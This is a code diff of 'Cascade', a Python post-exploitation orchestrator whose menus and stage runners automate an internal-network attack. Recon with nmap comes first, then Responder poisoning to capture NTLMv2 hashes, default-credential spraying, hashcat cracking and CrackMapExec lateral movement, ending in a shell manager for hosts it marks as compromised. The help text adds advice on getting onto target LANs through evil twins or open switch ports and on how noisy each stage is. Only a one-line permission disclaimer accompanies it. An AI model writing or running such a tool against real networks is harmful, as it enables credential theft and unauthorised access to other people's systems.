@@ -1,214 +1,648 @@
 #!/usr/bin/env python3
 """
 Cascade — Post-Exploitation Orchestrator
-=========================================
-Automated kill chain for internal network compromise:
-
-  Stage 1  Subnet recon      — nmap host & service discovery
-  Stage 2  Hash harvest      — Responder passive NTLM capture
-  Stage 3  Default cred spray — SSH / SMB / HTTP admin panels
-  Stage 4  Hash cracking     — hashcat / john against captured hashes
-  Stage 5  Lateral movement  — CrackMapExec + SSH pivoting
-
-Usage:
-  sudo cascade
-  sudo cascade -i eth0 --subnet 10.10.10.0/24
-  sudo cascade --stage 1
-  sudo cascade --no-harvest
-  sudo cascade --about
-
 Only run against networks you own or have explicit written permission to test.
 """
 
-import os, sys, argparse, shutil, time
+import os, sys, shutil, subprocess, time
 
-from . import tui
+from . import tui, iface
 from . import recon, harvest, spray, crack, lateral, shells
 
-# ── tool dependency check ─────────────────────────────────────────────────────
-_TOOLS = [
-    ("nmap",            "sudo apt install nmap"),
-    ("responder",       "sudo apt install responder"),
-    ("hashcat",         "sudo apt install hashcat"),
-    ("crackmapexec",    "sudo apt install crackmapexec"),
-]
 
-def _check_deps(skip_harvest: bool = False):
-    missing = []
-    for tool, install in _TOOLS:
-        if tool == "responder" and skip_harvest:
-            continue
-        if not shutil.which(tool):
-            missing.append((tool, install))
-    return missing
+# ── session state ─────────────────────────────────────────────────────────────
 
-# ── about ─────────────────────────────────────────────────────────────────────
-def _print_about():
-    from . import __version__
-    tui.clear()
-    tui.print_banner()
-    print(f"""  {tui.WH}{tui.B}WHAT IS CASCADE  v{__version__}{tui.R}
+class State:
+    def __init__(self):
+        self.interface    = "eth0"   # LAN interface (for nmap, Responder)
+        self.subnet       = None     # None = auto-detect
+        self.target_host  = None     # None = all hosts
+        self.harvest_time = 120
+        self.wordlist     = None
+        self.verbose      = False
+        self.full_scan    = False
+        self.skip_harvest = False
+        # runtime results
+        self.hosts        = []
+        self.hashes       = []
+        self.spray_creds  = []
+        self.cracked      = []
+        self.compromised  = []
 
-  Cascade automates the internal network post-exploitation kill chain —
-  everything after you have a foothold on a LAN segment. It chains five
-  stages into a single command with a red TUI status feed.
+    def all_creds(self) -> list[dict]:
+        return self.spray_creds + [
+            {"target": "N/A", "service": "ntlmv2",
+             "user": c["user"], "secret": c["password"]}
+            for c in self.cracked
+        ]
 
-  {tui.RED}{tui.B}STAGE 1 — Subnet Recon{tui.R}
-    Runs nmap across the detected (or specified) subnet. Identifies live
-    hosts, open ports, running services, and OS fingerprints.
+    def effective_subnet(self) -> str:
+        if self.subnet:
+            return self.subnet
+        detected = iface.get_subnet(self.interface)
+        return detected or "unknown"
 
-  {tui.RED}{tui.B}STAGE 2 — Hash Harvest (Responder){tui.R}
-    Launches Responder with WPAD + LLMNR + NBT-NS poisoning. Captures
-    NTLMv2 challenge-response hashes from any machine on the segment
-    that reaches out to resolve a name. Runs for a configurable window.
+    def status_bar(self) -> str:
+        iface_info = _iface_status(self.interface)
+        subnet_str = self.effective_subnet()
+        target_str = self.target_host or "all hosts"
 
-  {tui.RED}{tui.B}STAGE 3 — Default Credential Spray{tui.R}
-    Tries a curated list of default/common creds against SSH, SMB, and
-    HTTP admin panels on every discovered host. Threaded — all services
-    in parallel. Stops per-host on first success.
+        results = []
+        if self.hosts:       results.append(f"{tui.GRN}{len(self.hosts)} hosts{tui.R}")
+        if self.hashes:      results.append(f"{tui.YLW}{len(self.hashes)} hashes{tui.R}")
+        if self.spray_creds: results.append(f"{tui.GRN}{len(self.spray_creds)} creds{tui.R}")
+        if self.cracked:     results.append(f"{tui.GRN}{len(self.cracked)} cracked{tui.R}")
+        if self.compromised: results.append(f"{tui.RED}{tui.B}{len(self.compromised)} PWNED{tui.R}")
+        result_str = "  │  ".join(results) if results else f"{tui.DIM}no results yet{tui.R}"
 
-  {tui.RED}{tui.B}STAGE 4 — Hash Cracking{tui.R}
-    Feeds captured NTLMv2 hashes into hashcat (mode 5600) or john against
-    rockyou.txt. Displays cracked plaintext passwords immediately.
-
-  {tui.RED}{tui.B}STAGE 5 — Lateral Movement{tui.R}
-    Uses every valid credential (sprayed + cracked) with CrackMapExec
-    over SMB/WinRM and paramiko over SSH. Flags Pwn3d! hosts. Optionally
-    runs secretsdump for hash extraction from compromised Windows boxes.
-
-  {tui.WH}{tui.B}USAGE{tui.R}
-    sudo cascade                        full auto on detected subnet
-    sudo cascade -i eth0                specify interface
-    sudo cascade --subnet 10.0.0.0/24   specify subnet manually
-    sudo cascade --stage 3              run only stage 3 (cred spray)
-    sudo cascade --no-harvest           skip Responder (quiet mode)
-    sudo cascade --harvest-time 300     longer Responder window (seconds)
-    sudo cascade -v                     verbose output
-    sudo cascade --about                this screen
-
-  {tui.DIM}Only run against networks you own or have explicit permission to test.{tui.R}
-""")
+        return (
+            f"  {tui.DIM}Interface :{tui.R} {iface_info}\n"
+            f"  {tui.DIM}Subnet    :{tui.R} {tui.WH}{subnet_str}{tui.R}  "
+            f"{tui.DIM}Target:{tui.R} {tui.WH}{target_str}{tui.R}\n"
+            f"  {tui.DIM}Session   :{tui.R} {result_str}"
+        )
 
 
-# ── stage runners ─────────────────────────────────────────────────────────────
+def _iface_status(name: str) -> str:
+    for i in iface.list_interfaces():
+        if i["name"] == name:
+            ip  = i["ip"] or tui.YLW + "no IP" + tui.R
+            mode = f"  {tui.DIM}[{i['mode']}]{tui.R}" if i["mode"] != "?" else ""
+            ok   = tui.GRN if i["ip"] else tui.RED
+            return f"{ok}{tui.B}{name}{tui.R}  {tui.WH}{ip}{tui.R}{mode}"
+    return f"{tui.DIM}{name} (not found){tui.R}"
 
-def stage1_recon(args) -> list[dict]:
+
+# ── stage runners (with confirm) ──────────────────────────────────────────────
+
+def _confirm(stage_name: str, detail: str, noise: str) -> str:
+    """
+    Ask user to continue, skip, or stop.
+    Returns 'run', 'skip', or 'stop'.
+    """
+    tui.divider()
+    print(f"\n  {tui.RED}{tui.B}{stage_name}{tui.R}")
+    print(f"  {tui.DIM}{detail}{tui.R}")
+    print(f"  {tui.YLW}Noise level: {noise}{tui.R}\n")
+    while True:
+        raw = input(f"  {tui.WH}{tui.B}[Y] run  [s] skip  [q] stop here → {tui.R}").strip().lower()
+        if raw in ("", "y"):  return "run"
+        if raw == "s":        return "skip"
+        if raw == "q":        return "stop"
+
+
+def run_stage1(state: State) -> bool:
+    decision = _confirm(
+        "STAGE 1 — RECON",
+        f"nmap scan of {state.effective_subnet()}. Finds live hosts, ports, services.",
+        "LOW — passive scan, no exploitation"
+    )
+    if decision == "stop": return False
+    if decision == "skip": tui.warn("Stage 1 skipped."); return True
+
     tui.phase("STAGE 1 — RECON")
-    hosts = recon.scan(subnet=args.subnet, fast=not args.full_scan)
+    hosts = recon.scan(
+        subnet  = state.subnet,
+        fast    = not state.full_scan
+    )
+    state.hosts = hosts
     if not hosts:
         tui.warn("No hosts found. Check interface and subnet.")
-        return []
-    tui.success(f"Found {len(hosts)} host(s)")
-    tui.host_table(hosts)
-    return hosts
+    else:
+        tui.success(f"Found {len(hosts)} host(s)")
+        tui.host_table(hosts)
+    return True
 
 
-def stage2_harvest(args) -> list[str]:
+def run_stage2(state: State) -> bool:
+    if state.skip_harvest:
+        tui.warn("Stage 2 skipped (skip-harvest is ON).")
+        return True
+
+    decision = _confirm(
+        "STAGE 2 — HASH HARVEST",
+        f"Responder poisons LLMNR/NBT-NS on {state.interface} for {state.harvest_time}s.\n"
+        f"  Windows machines hand over NTLMv2 hashes automatically.",
+        "MEDIUM — poisoning LLMNR/NBT-NS, visible in Wireshark"
+    )
+    if decision == "stop": return False
+    if decision == "skip": tui.warn("Stage 2 skipped."); return True
+
     tui.phase("STAGE 2 — HASH HARVEST")
-    if args.no_harvest:
-        tui.warn("Skipped (--no-harvest)")
-        return []
-    hashes = harvest.wait_and_capture(args.interface, timeout=args.harvest_time)
+    hashes = harvest.wait_and_capture(state.interface, timeout=state.harvest_time)
+    state.hashes = hashes
     if hashes:
         tui.success(f"Captured {len(hashes)} hash(es)")
         for h in hashes:
             print(f"    {tui.DIM}{h[:80]}{'…' if len(h) > 80 else ''}{tui.R}")
     else:
         tui.warn("No hashes captured — network may be quiet or Responder blocked")
-    return hashes
+    return True
 
 
-def stage3_spray(hosts, args) -> list[dict]:
+def run_stage3(state: State) -> bool:
+    if not state.hosts:
+        tui.warn("No hosts from Stage 1 — run recon first or skip.")
+
+    decision = _confirm(
+        "STAGE 3 — CREDENTIAL SPRAY",
+        f"Tries default credentials (admin/admin, root/root, etc.) against\n"
+        f"  SSH, SMB, and HTTP admin panels on {len(state.hosts)} discovered host(s).",
+        "MEDIUM — login attempts, may trigger lockout policies"
+    )
+    if decision == "stop": return False
+    if decision == "skip": tui.warn("Stage 3 skipped."); return True
+
     tui.phase("STAGE 3 — CREDENTIAL SPRAY")
-    if not hosts:
+    if not state.hosts:
         tui.warn("No hosts to spray.")
-        return []
-    results = spray.spray(hosts, verbose=args.verbose)
+        return True
+
+    results = spray.spray(state.hosts, verbose=state.verbose)
+    state.spray_creds = results
     if results:
-        tui.success(f"Spray found {len(results)} valid credential(s)")
+        tui.success(f"Found {len(results)} valid credential(s)")
         tui.cred_table(results)
     else:
         tui.warn("No default credentials found")
-    return results
+    return True
 
 
-def stage4_crack(hashes, args) -> list[dict]:
+def run_stage4(state: State) -> bool:
+    if not state.hashes:
+        tui.warn("No hashes from Stage 2.")
+
+    decision = _confirm(
+        "STAGE 4 — HASH CRACKING",
+        f"hashcat NTLMv2 (mode 5600) against rockyou.txt.\n"
+        f"  {len(state.hashes)} hash(es) queued.",
+        "LOW — local CPU/GPU, no network traffic"
+    )
+    if decision == "stop": return False
+    if decision == "skip": tui.warn("Stage 4 skipped."); return True
+
     tui.phase("STAGE 4 — HASH CRACKING")
-    if not hashes:
-        tui.warn("No hashes to crack.")
-        return []
-    cracked = crack.crack_ntlmv2(hashes, wordlist=args.wordlist)
+    if not state.hashes:
+        # offer manual paste
+        print(f"  {tui.DIM}No hashes from Responder. Paste NTLMv2 hashes below (empty line to finish):{tui.R}\n")
+        lines = []
+        while True:
+            try:
+                line = input("  ").strip()
+            except (EOFError, KeyboardInterrupt):
+                break
+            if not line:
+                break
+            lines.append(line)
+        state.hashes = lines
+
+    cracked = crack.crack_ntlmv2(state.hashes, wordlist=state.wordlist)
+    state.cracked = cracked
     if cracked:
         tui.success(f"Cracked {len(cracked)} hash(es)")
-        for c in cracked:
-            tui.cred_table([{"target": "N/A", "service": "ntlmv2",
-                             "user": c["user"], "secret": c["password"]}])
     else:
         tui.warn("No hashes cracked")
-    return cracked
+    return True
 
 
-def stage5_lateral(hosts, all_creds, args) -> list[dict]:
-    """Returns list of { host, cred } dicts for compromised targets."""
-    tui.phase("STAGE 5 — LATERAL MOVEMENT")
-    if not all_creds:
+def run_stage5(state: State) -> bool:
+    creds = state.all_creds()
+    if not creds:
         tui.warn("No credentials available for lateral movement.")
-        return []
 
+    decision = _confirm(
+        "STAGE 5 — LATERAL MOVEMENT",
+        f"CrackMapExec over SMB/WinRM + SSH with {len(creds)} credential(s)\n"
+        f"  against {len(state.hosts)} host(s).",
+        "HIGH — active login attempts on every host, very noisy"
+    )
+    if decision == "stop": return False
+    if decision == "skip": tui.warn("Stage 5 skipped."); return True
+
+    tui.phase("STAGE 5 — LATERAL MOVEMENT")
+    if not creds:
+        tui.warn("No credentials to use.")
+        return True
+
+    host_map    = {h["ip"]: h for h in state.hosts}
+    raw_results = lateral.run_kill_chain(state.hosts, creds)
     compromised = []
-    host_map    = {h["ip"]: h for h in hosts}
-
-    raw_results = lateral.run_kill_chain(hosts, all_creds)
     for r in raw_results:
         if r.get("pwned"):
             host = host_map.get(r["ip"], {"ip": r["ip"], "hostname": "", "ports": []})
-            cred = next(
-                (c for c in all_creds if c["user"] == r.get("user")),
-                all_creds[0]
-            )
+            cred = next((c for c in creds if c["user"] == r.get("user")), creds[0])
             compromised.append({"host": host, "cred": cred})
 
+    state.compromised = compromised
     if compromised:
         tui.success(f"Gained access to {len(compromised)} host(s)")
     else:
         tui.warn("No lateral movement succeeded")
-    return compromised
+    return True
 
 
-# ── summary ───────────────────────────────────────────────────────────────────
+# ── full kill chain ───────────────────────────────────────────────────────────
 
-def _print_summary(hosts, hashes, spray_creds, cracked, compromised):
+def run_full_chain(state: State):
+    tui.clear()
+    tui.print_banner()
+    tui.phase("KILL CHAIN")
+    tui.info(f"Interface : {state.interface}")
+    tui.info(f"Subnet    : {state.effective_subnet()}")
+    tui.info(f"Target    : {state.target_host or 'all hosts'}")
+    tui.info(f"Harvest   : {'skip' if state.skip_harvest else str(state.harvest_time) + 's'}")
+    print()
+
+    try:
+        if not run_stage1(state): return
+        if not run_stage2(state): return
+        if not run_stage3(state): return
+        if not run_stage4(state): return
+        if not run_stage5(state): return
+    except KeyboardInterrupt:
+        print(f"\n\n  {tui.DIM}Interrupted.{tui.R}\n")
+
+    _print_summary(state)
+
+    if state.compromised:
+        ans = input(f"\n  {tui.WH}{tui.B}Open shell manager? [Y/n] {tui.R}").strip().lower()
+        if ans != "n":
+            shells.access_menu(state.compromised)
+    elif state.all_creds():
+        guesses = [
+            {"host": h, "cred": state.all_creds()[0]}
+            for h in state.hosts
+            if any(p in (h.get("ports") or []) for p in [22, 445, 5985])
+        ]
+        if guesses:
+            ans = input(f"\n  {tui.WH}{tui.B}Try manual shell with found credentials? [Y/n] {tui.R}").strip().lower()
+            if ans != "n":
+                shells.access_menu(guesses)
+
+
+def _print_summary(state: State):
     tui.phase("RESULTS")
-    tui.stage_result("Recon",         bool(hosts),        f"{len(hosts)} host(s) found")
-    tui.stage_result("Hash Harvest",  bool(hashes),       f"{len(hashes)} hash(es) captured")
-    tui.stage_result("Cred Spray",    bool(spray_creds),  f"{len(spray_creds)} valid cred(s)")
-    tui.stage_result("Hash Cracking", bool(cracked),      f"{len(cracked)} cracked")
-    tui.stage_result("Lateral Move",  bool(compromised),  f"{len(compromised)} host(s) compromised")
+    tui.stage_result("Recon",         bool(state.hosts),        f"{len(state.hosts)} host(s)")
+    tui.stage_result("Hash Harvest",  bool(state.hashes),       f"{len(state.hashes)} hash(es)")
+    tui.stage_result("Cred Spray",    bool(state.spray_creds),  f"{len(state.spray_creds)} valid")
+    tui.stage_result("Hash Cracking", bool(state.cracked),      f"{len(state.cracked)} cracked")
+    tui.stage_result("Lateral Move",  bool(state.compromised),  f"{len(state.compromised)} PWNED")
 
-    all_creds = spray_creds + [
-        {"target": "N/A", "service": "ntlmv2", "user": c["user"], "secret": c["password"]}
-        for c in cracked
-    ]
-    if all_creds:
+    if state.all_creds():
         print()
         tui.success("Valid credentials:")
-        tui.cred_table(all_creds)
+        tui.cred_table(state.all_creds())
 
-    if compromised:
+    if state.compromised:
         print()
         tui.success("Compromised hosts:")
-        for e in compromised:
+        for e in state.compromised:
             h = e["host"]; c = e["cred"]
             print(f"    {tui.GRN}{tui.B}{h['ip']:<16}{tui.R}  "
                   f"{tui.DIM}{h.get('hostname','')}  as {c['user']}{tui.R}")
+    print()
 
+
+# ── setup menu ────────────────────────────────────────────────────────────────
+
+def setup_menu(state: State):
+    while True:
+        tui.clear()
+        tui.print_banner()
+        tui.phase("SETUP")
+
+        interfaces = iface.list_interfaces()
+        for i in interfaces:
+            ip_str   = i["ip"]   or f"{tui.YLW}no IP{tui.R}"
+            mode_str = f"  [{i['mode']}]" if i["mode"] != "?" else ""
+            ok       = tui.GRN if i["ip"] else tui.RED
+            print(f"    {ok}{i['name']:<12}{tui.R}  {tui.WH}{ip_str:<16}{tui.R}"
+                  f"  {tui.DIM}{i['mac'] or ''}{tui.R}{mode_str}")
+
+        print()
+        tui.divider()
+        print(f"  {tui.RED}{tui.B} 1{tui.R}  {tui.WH}Select LAN interface{tui.R}"
+              f"  {tui.DIM}current: {state.interface}{tui.R}")
+        print(f"  {tui.RED}{tui.B} 2{tui.R}  {tui.WH}Switch adapter mode{tui.R}"
+              f"  {tui.DIM}(managed ↔ monitor for wireless adapters){tui.R}")
+        print(f"  {tui.RED}{tui.B} 3{tui.R}  {tui.WH}Set subnet manually{tui.R}"
+              f"  {tui.DIM}current: {state.subnet or 'auto-detect'}{tui.R}")
+        print(f"  {tui.RED}{tui.B} 4{tui.R}  {tui.WH}Set target host{tui.R}"
+              f"  {tui.DIM}current: {state.target_host or 'all hosts'}{tui.R}")
+        print(f"  {tui.RED}{tui.B} 5{tui.R}  {tui.WH}Set Responder window{tui.R}"
+              f"  {tui.DIM}current: {state.harvest_time}s{tui.R}")
+        print(f"  {tui.RED}{tui.B} 6{tui.R}  {tui.WH}Set custom wordlist{tui.R}"
+              f"  {tui.DIM}current: {state.wordlist or 'rockyou.txt (default)'}{tui.R}")
+        print(f"  {tui.RED}{tui.B} 7{tui.R}  {tui.WH}Toggle skip-harvest{tui.R}"
+              f"  {tui.DIM}current: {'ON (Responder will be skipped)' if state.skip_harvest else 'off'}{tui.R}")
+        print(f"  {tui.RED}{tui.B} 8{tui.R}  {tui.WH}Toggle verbose{tui.R}"
+              f"  {tui.DIM}current: {'on' if state.verbose else 'off'}{tui.R}")
+        print(f"  {tui.RED}{tui.B} 9{tui.R}  {tui.WH}Connect to network (nmtui){tui.R}"
+              f"  {tui.DIM}recommended if not connected to target LAN{tui.R}")
+        print(f"  {tui.RED}{tui.B}10{tui.R}  {tui.WH}Show tool status{tui.R}"
+              f"  {tui.DIM}which required tools are installed{tui.R}")
+        tui.divider()
+        print(f"\n  {tui.DIM}   0 / Enter → back{tui.R}\n")
+
+        raw = input(f"  {tui.WH}{tui.B}setup → {tui.R}").strip()
+
+        if raw in ("0", ""):
+            return
+
+        elif raw == "1":
+            _pick_interface(state, interfaces)
+
+        elif raw == "2":
+            _switch_mode_menu(interfaces)
+
+        elif raw == "3":
+            v = input(f"\n  {tui.WH}Subnet CIDR (e.g. 192.168.1.0/24, blank = auto): {tui.R}").strip()
+            state.subnet = v or None
+            tui.success(f"Subnet set to: {state.subnet or 'auto-detect'}")
+            time.sleep(0.8)
+
+        elif raw == "4":
+            v = input(f"\n  {tui.WH}Target IP (blank = all hosts): {tui.R}").strip()
+            state.target_host = v or None
+            tui.success(f"Target set to: {state.target_host or 'all hosts'}")
+            time.sleep(0.8)
+
+        elif raw == "5":
+            v = input(f"\n  {tui.WH}Responder window in seconds (current: {state.harvest_time}): {tui.R}").strip()
+            try:
+                state.harvest_time = int(v)
+                tui.success(f"Harvest time set to {state.harvest_time}s")
+            except ValueError:
+                tui.warn("Invalid number.")
+            time.sleep(0.8)
+
+        elif raw == "6":
+            v = input(f"\n  {tui.WH}Wordlist path (blank = default rockyou.txt): {tui.R}").strip()
+            state.wordlist = v or None
+            tui.success(f"Wordlist: {state.wordlist or 'default'}")
+            time.sleep(0.8)
+
+        elif raw == "7":
+            state.skip_harvest = not state.skip_harvest
+            tui.success(f"Skip-harvest: {'ON' if state.skip_harvest else 'off'}")
+            time.sleep(0.8)
+
+        elif raw == "8":
+            state.verbose = not state.verbose
+            tui.success(f"Verbose: {'on' if state.verbose else 'off'}")
+            time.sleep(0.8)
+
+        elif raw == "9":
+            iface.launch_nmtui()
+
+        elif raw == "10":
+            tui.clear()
+            tui.print_banner()
+            tui.phase("TOOL STATUS")
+            iface.print_tool_status()
+            input(f"  {tui.DIM}[ press Enter to go back ]{tui.R}")
+
+
+def _pick_interface(state: State, interfaces: list[dict]):
+    if not interfaces:
+        tui.warn("No interfaces found.")
+        return
     print()
-    if compromised or all_creds:
-        tui.success("Kill chain complete — access obtained.")
-    else:
-        tui.warn("Kill chain finished — no access gained. "
-                 "Try longer harvest window or custom wordlist.")
+    for i, ifc in enumerate(interfaces, 1):
+        ip_str = ifc["ip"] or f"{tui.YLW}no IP{tui.R}"
+        print(f"  {tui.RED}{tui.B}{i:>2}{tui.R}  {tui.WH}{ifc['name']:<12}{tui.R}  {ip_str}")
     print()
+    raw = input(f"  {tui.WH}Select interface [1-{len(interfaces)}]: {tui.R}").strip()
+    try:
+        idx = int(raw) - 1
+        if 0 <= idx < len(interfaces):
+            state.interface = interfaces[idx]["name"]
+            state.subnet    = None   # reset subnet when interface changes
+            tui.success(f"Interface set to: {state.interface}")
+            # Warn if no IP
+            if not interfaces[idx]["ip"]:
+                print()
+                iface.connection_advice(state.interface)
+                input(f"  {tui.DIM}[ press Enter to continue ]{tui.R}")
+    except ValueError:
+        pass
+    time.sleep(0.4)
+
+
+def _switch_mode_menu(interfaces: list[dict]):
+    wireless = [i for i in interfaces if i["mode"] not in ("?", "N/A", None)]
+    if not wireless:
+        tui.warn("No wireless adapters detected.")
+        time.sleep(1)
+        return
+    print()
+    for i, ifc in enumerate(wireless, 1):
+        print(f"  {tui.RED}{tui.B}{i:>2}{tui.R}  {tui.WH}{ifc['name']:<12}{tui.R}  "
+              f"{tui.YLW}[{ifc['mode']}]{tui.R}")
+    print()
+    raw = input(f"  {tui.WH}Select adapter [1-{len(wireless)}]: {tui.R}").strip()
+    try:
+        idx = int(raw) - 1
+        if 0 <= idx < len(wireless):
+            name    = wireless[idx]["name"]
+            current = wireless[idx]["mode"].lower()
+            target  = "managed" if "monitor" in current else "monitor"
+            confirm = input(
+                f"\n  {tui.WH}Switch {name} from {tui.YLW}{current}{tui.R} "
+                f"to {tui.YLW}{target}{tui.R}? [Y/n] {tui.R}"
+            ).strip().lower()
+            if confirm != "n":
+                iface.set_mode(name, target)
+                time.sleep(1)
+    except (ValueError, IndexError):
+        pass
+
+
+# ── about / help ──────────────────────────────────────────────────────────────
+
+def _print_about():
+    from . import __version__
+    tui.clear()
+    tui.print_banner()
+    print(f"""  {tui.WH}{tui.B}CASCADE  v{__version__}  —  Post-Exploitation Kill Chain Orchestrator{tui.R}
+
+  Cascade automates the internal network kill chain. Once you have a
+  foothold on a LAN segment (ethernet, evil twin, open port) it chains
+  five stages into a guided, menu-driven attack flow.
+
+  {tui.RED}{tui.B}STAGE 1 — Recon{tui.R}
+    nmap sweeps the subnet. Finds live hosts, open ports, services, OS.
+    Noise: LOW. Takes 30-90 seconds.
+
+  {tui.RED}{tui.B}STAGE 2 — Hash Harvest (Responder){tui.R}
+    Poisons LLMNR / NBT-NS / WPAD. Windows machines automatically hand
+    over NTLMv2 hashes when they try to resolve any name. You just wait.
+    Noise: MEDIUM. Visible in Wireshark. Runs for a configurable window.
+
+  {tui.RED}{tui.B}STAGE 3 — Credential Spray{tui.R}
+    Tries default/common creds (admin/admin, root/root, pi/raspberry...)
+    against SSH, SMB, and HTTP admin panels on every discovered host.
+    Noise: MEDIUM. Login attempts logged on target systems.
+
+  {tui.RED}{tui.B}STAGE 4 — Hash Cracking{tui.R}
+    hashcat NTLMv2 (mode 5600) against rockyou.txt or custom wordlist.
+    Noise: ZERO — local CPU/GPU only.
+
+  {tui.RED}{tui.B}STAGE 5 — Lateral Movement{tui.R}
+    CrackMapExec over SMB/WinRM + paramiko over SSH. If any cred is a
+    local admin on a host, it shows Pwn3d! — full command execution.
+    Noise: HIGH — many login attempts across the network.
+
+  {tui.WH}{tui.B}ADAPTER STATE{tui.R}
+    Cascade uses a LAN interface (eth0, wlan0, etc.) in {tui.YLW}MANAGED{tui.R} mode.
+    Do NOT put the interface in monitor mode — Responder and nmap need
+    normal (managed) operation. Monitor mode is for WiFi capture tools
+    like Fracture, wifite, and airgeddon.
+
+  {tui.WH}{tui.B}GETTING ON THE NETWORK{tui.R}
+    You must be on the same LAN as your targets before running Cascade.
+    Options:
+    - {tui.DIM}Ethernet: plug into any switch port in the building{tui.R}
+    - {tui.DIM}WiFi: use nmtui (option 9 in Setup) to connect to the target network{tui.R}
+    - {tui.DIM}Evil twin: use airgeddon/portal_cloner to get the WiFi password first{tui.R}
+
+  {tui.WH}{tui.B}REQUIRED TOOLS{tui.R}
+    {tui.DIM}sudo apt install nmap responder hashcat crackmapexec sshpass smbclient python3-impacket{tui.R}
+    {tui.DIM}sudo gem install evil-winrm{tui.R}
+
+  {tui.DIM}Only run against networks you own or have explicit permission to test.{tui.R}
+""")
+    input(f"  {tui.DIM}[ press Enter to go back ]{tui.R}")
+
+
+# ── main menu ─────────────────────────────────────────────────────────────────
+
+def _warn_missing(state: State):
+    """One-line missing tool warning for status bar."""
+    missing = [t["tool"] for t in iface.check_tools() if not t["found"]]
+    if missing:
+        return (f"\n  {tui.YLW}{tui.B}Missing tools:{tui.R} "
+                f"{tui.DIM}{', '.join(missing[:4])}{'...' if len(missing) > 4 else ''}"
+                f"  (run Setup → 10 for details){tui.R}")
+    return ""
+
+
+def _warn_no_ip(state: State):
+    """Warn if selected interface has no IP."""
+    if not iface.has_ip(state.interface):
+        return (f"\n  {tui.RED}{tui.B}[!]{tui.R} {tui.YLW}{state.interface} has no IP address "
+                f"— not connected to a network. Go to Setup → Connect (9).{tui.R}")
+    return ""
+
+
+def main_menu(state: State):
+    while True:
+        tui.clear()
+        tui.print_banner()
+
+        print(state.status_bar())
+        print(_warn_no_ip(state))
+        print(_warn_missing(state))
+        print()
+        tui.divider()
+
+        print(f"  {tui.RED}{tui.B} 1{tui.R}  {tui.WH}{tui.B}Full kill chain{tui.R}"
+              f"  {tui.DIM}guided: recon → harvest → spray → crack → lateral → shells{tui.R}")
+        print()
+        print(f"  {tui.RED}{tui.B} 2{tui.R}  {tui.WH}Recon{tui.R}"
+              f"          {tui.DIM}nmap scan — find hosts, ports, services{tui.R}")
+        print(f"  {tui.RED}{tui.B} 3{tui.R}  {tui.WH}Hash harvest{tui.R}"
+              f"   {tui.DIM}Responder — capture NTLMv2 hashes passively{tui.R}")
+        print(f"  {tui.RED}{tui.B} 4{tui.R}  {tui.WH}Cred spray{tui.R}"
+              f"     {tui.DIM}SSH / SMB / HTTP default credential spray{tui.R}")
+        print(f"  {tui.RED}{tui.B} 5{tui.R}  {tui.WH}Crack hashes{tui.R}"
+              f"   {tui.DIM}hashcat NTLMv2 against wordlist{tui.R}")
+        print(f"  {tui.RED}{tui.B} 6{tui.R}  {tui.WH}Lateral movement{tui.R}"
+              f"  {tui.DIM}CrackMapExec + SSH with found credentials{tui.R}")
+        print()
+        print(f"  {tui.RED}{tui.B} 7{tui.R}  {tui.WH}Shell manager{tui.R}"
+              f"  {tui.DIM}connect to compromised hosts — "
+              f"{len(state.compromised)} available{tui.R}")
+        print(f"  {tui.RED}{tui.B} 8{tui.R}  {tui.WH}Saved sessions{tui.R}"
+              f" {tui.DIM}reconnect to previously compromised hosts{tui.R}")
+        print()
+        print(f"  {tui.DIM}   s  Setup          f  Free commands (bash)   "
+              f"h  Help / about   q  Quit{tui.R}")
+        tui.divider()
+        print()
+
+        try:
+            raw = input(f"  {tui.WH}{tui.B}→ {tui.R}").strip().lower()
+        except KeyboardInterrupt:
+            raw = "q"
+
+        if raw == "q":
+            print(f"\n  {tui.DIM}bye.{tui.R}\n")
+            sys.exit(0)
+
+        elif raw == "1":
+            run_full_chain(state)
+            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")
+
+        elif raw == "2":
+            tui.clear(); tui.print_banner()
+            run_stage1(state)
+            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")
+
+        elif raw == "3":
+            tui.clear(); tui.print_banner()
+            run_stage2(state)
+            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")
+
+        elif raw == "4":
+            tui.clear(); tui.print_banner()
+            run_stage3(state)
+            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")
+
+        elif raw == "5":
+            tui.clear(); tui.print_banner()
+            run_stage4(state)
+            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")
+
+        elif raw == "6":
+            tui.clear(); tui.print_banner()
+            run_stage5(state)
+            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")
+
+        elif raw == "7":
+            if state.compromised:
+                shells.access_menu(state.compromised)
+            else:
+                tui.clear(); tui.print_banner()
+                tui.warn("No compromised hosts yet — run the kill chain first.")
+                # Still let user try with any found creds
+                creds = state.all_creds()
+                if creds:
+                    targets = [
+                        {"host": h, "cred": creds[0]}
+                        for h in state.hosts
+                        if any(p in (h.get("ports") or []) for p in [22, 445, 5985])
+                    ]
+                    if targets:
+                        ans = input(f"  {tui.WH}Try shell with found credentials anyway? [Y/n] {tui.R}").strip().lower()
+                        if ans != "n":
+                            shells.access_menu(targets)
+                            continue
+                input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")
+
+        elif raw == "8":
+            shells.saved_menu()
+
+        elif raw == "s":
+            setup_menu(state)
+
+        elif raw == "f":
+            tui.clear()
+            print(f"  {tui.DIM}Dropping to bash. Type 'exit' to return to Cascade.{tui.R}\n")
+            subprocess.call(["bash", "--login"])
+
+        elif raw == "h":
+            _print_about()
 
 
 # ── entry point ───────────────────────────────────────────────────────────────
@@ -218,121 +652,25 @@ def main():
         print("[!] Run as root: sudo cascade")
         sys.exit(1)
 
+    import argparse
     ap = argparse.ArgumentParser(
-        description="Cascade — Post-exploitation kill chain orchestrator",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
+        description="Cascade — Post-exploitation orchestrator",
         epilog="Only run against networks you own or have permission to test.",
     )
-    ap.add_argument("-i", "--interface",    default="eth0",
-                    help="Network interface (default: eth0)")
-    ap.add_argument("--subnet",             metavar="CIDR",
-                    help="Target subnet, e.g. 192.168.1.0/24 (auto-detect if omitted)")
-    ap.add_argument("--stage", type=int,    choices=range(1, 6), default=0,
-                    help="Run only a specific stage (1-5)")
-    ap.add_argument("--no-harvest",         action="store_true",
-                    help="Skip Responder hash harvesting (quiet/passive mode)")
-    ap.add_argument("--harvest-time", type=int, default=120, metavar="SECS",
-                    help="Responder capture window in seconds (default: 120)")
-    ap.add_argument("--full-scan",          action="store_true",
-                    help="Full nmap port scan instead of fast top-100")
